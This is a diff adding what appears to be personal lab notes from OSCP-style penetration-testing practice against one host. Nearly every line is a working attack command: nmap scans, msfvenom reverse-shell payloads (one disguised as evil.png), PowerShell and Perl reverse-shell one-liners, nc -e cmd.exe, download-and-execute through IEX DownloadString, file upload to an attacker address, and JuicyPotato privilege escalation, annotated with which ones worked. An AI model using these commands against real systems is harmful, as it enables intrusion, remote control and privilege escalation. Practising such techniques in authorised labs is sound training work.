@@ -1,0 +1,53 @@
+nmap -sTVC 10.11.1.13 -Pn -p- > nmap.txt
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.197 LPORT=4444 -f aspx > shell.aspx
+msfvenom -p windows/meterpreter/reverse/tcp LHOST=192.168.119.197 LPORT=4444 -f exe  > shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.197 LPORT=443 -f exe -o shell_reverse.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.197 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
+
+
+##work
+cp aspx/cmdasp.aspx ~/PycharmProjects/Kali/oscp/10.11.1.13/
+cp asp/cmdasp.asp ~/PycharmProjects/Kali/oscp/10.11.1.13/
+##notwork
+cp asp/cmd-asp-5.1.asp ~/PycharmProjects/Kali/oscp/10.11.1.13/
+
+###not work
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.119.197",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+###work
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.197',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.197',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendb yte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+
+ftp 10.11.1.13
+name:anonymous
+password:
+
+
+C:\inetpub\wwwroot\JuicyPotato.exe -t t -p C:\inetpub\wwwroot\whoami.exe -l 5837
+powershell C:\inetpub\wwwroot\JuicyPotato.exe -t * -p C:\inetpub\wwwroot\shell.bat -l 444
+
+nc.exe 192.168.119.197  4444 -e cmd.exe
+C:\Windows\System32\cmd.exe
+whoami /all
+
+powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.197/jc.exe', 'jc.exe')
+
+perl -e 'use Socket;$i="192.168.119.197";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+msfvenom -p php/reverse_php LHOST=192.168.119.197 LPORT=4444 -f raw -b '"' > evil.png
+
+Invoke-WebRequest "http://192.168.119.197:80/shell.exe" -OutFile shell.exe
+
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.197/Invoke-PowerShellTcp.ps1')
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.197/JuicyPotato.exe')
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.197/Invoke-PowerShellTcp.ps1')
+
+
+
+msfvenom -p cmd/windows/reverse_powershell lhost=192.168.119.197 lport=443 > shell.bat
+
+
+get-content .\proof.txt
+C:\inetpub\wwwroot\jc.exe -t * -p C:\inetpub\wwwroot\shell.bat -l 444
+jc.exe -t * -p shell.bat -l 444
